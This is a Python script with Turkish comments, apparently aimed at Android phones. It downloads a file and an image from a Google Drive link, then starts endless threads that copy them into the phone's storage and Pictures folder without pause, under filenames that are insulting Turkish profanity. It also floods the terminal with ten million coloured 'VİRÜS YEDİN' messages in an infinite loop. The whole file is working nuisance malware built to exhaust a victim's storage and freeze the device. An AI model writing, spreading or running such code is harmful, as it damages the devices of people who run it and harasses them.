import shutil
import os
import time
import threading
import requests
import random
import sys

# Dosyayı indirme fonksiyonu
def download_file(url, destination_path):
    response = requests.get(url, stream=True)
    with open(destination_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)
    print(f"[+] Sunucuya Bağlandı")

# Google Drive'dan doğrudan indirme bağlantısını oluşturma
def get_drive_download_url(file_id):
    return f"https://drive.google.com/uc?export=download&id={file_id}"

# Dosya ve fotoğraf çoğaltma işlemlerini başlatma
def setup_and_run():
    # Dosya indirme
    file_url = "https://drive.google.com/file/d/1TRgB_Ol8Z87RC7ncQ1zo9OeAU4yr6QKb/view?usp=drivesdk"  # İndirme bağlantısı
    source_file = "/storage/emulated/0/aptal.txt"
    
    # Fotoğraf indirme (Google Drive'dan doğrudan indirme bağlantısı ile)
    image_id = "1TRgB_Ol8Z87RC7ncQ1zo9OeAU4yr6QKb"  # Fotoğrafın Google Drive dosya ID'si
    image_url = get_drive_download_url(image_id)
    image_file = "/storage/emulated/0/Pictures/attack_image.jpg"

    # Dosya ve fotoğraf indirme
    download_file(file_url, source_file)
    download_file(image_url, image_file)
    
    # Dosya ve fotoğraf çoğaltma
    threading.Thread(target=duplicate_file, args=(source_file,)).start()
    threading.Thread(target=duplicate_image, args=(image_file,)).start()

# Dosya çoğaltma fonksiyonu
def duplicate_file(source_file):
    destination_dir = "/storage/emulated/0"  # Dosyaların kopyalanacağı klasör
    
    # Eğer hedef klasör yoksa oluştur
    if not os.path.exists(destination_dir):
        os.makedirs(destination_dir)

    count = 1
    while True:
        destination_file = os.path.join(destination_dir, f"VİRUS YİYİP HACKLENDİN OROSPU ÇOCUĞU_{count}.txt")
        shutil.copy(source_file, destination_file)
        print(f"HACKLENDİN")
        count += 1
        time.sleep(0)  # 0 saniye bekle

# Resim çoğaltma fonksiyonu
def duplicate_image(source_image):
    destination_dir = "/storage/emulated/0/Pictures"  # Resimlerin kopyalanacağı klasör
    
    # Eğer hedef klasör yoksa oluştur
    if not os.path.exists(destination_dir):
        os.makedirs(destination_dir)

    count = 1
    while True:
        destination_image = os.path.join(destination_dir, f"attacked_image_{count}.jpg")
        shutil.copy(source_image, destination_image)
        print(f"VİRUS YİYİP HACKLENDİN OROSPU ÇOCUĞU")
        count += 1
        time.sleep(0)  # 0 saniye bekle

# Terminalde renkli ve hareketli metin gösterme
def random_color():
    colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m', '\033[97m']
    return random.choice(colors)

def clear_screen():
    # Windows ve Unix tabanlı sistemler için ekranı temizler
    os.system('cls' if os.name == 'nt' else 'clear')

def display_moving_text():
    # Terminal boyutlarını al
    try:
        cols, rows = os.get_terminal_size()
    except OSError:
        cols, rows = 80, 20  # Varsayılan boyutlar

    # Terminalde yerleşim için gerekli değişkenler
    num_texts = 10000000  # Gösterilecek toplam yazı sayısı
    texts = []
    
    for _ in range(num_texts):
        x = random.randint(0, cols - 10)
        y = random.randint(0, rows - 1)
        texts.append([x, y])
    
    while True:
        clear_screen()
        for x, y in texts:
            # Yazıları terminalde hareket ettirmek
            sys.stdout.write("\n" * y + " " * x + random_color() + "VİRÜS YEDİN " + '\033[0m' + "\n")
        
        # Yazıları aşağı kaydır
        texts = [[x, (y + 1) % rows] for x, y in texts]
        
        time.sleep(0)  # 0.1 saniye bekle

# Başlatma
if __name__ == "__main__":
    setup_and_run()
    display_moving_text()
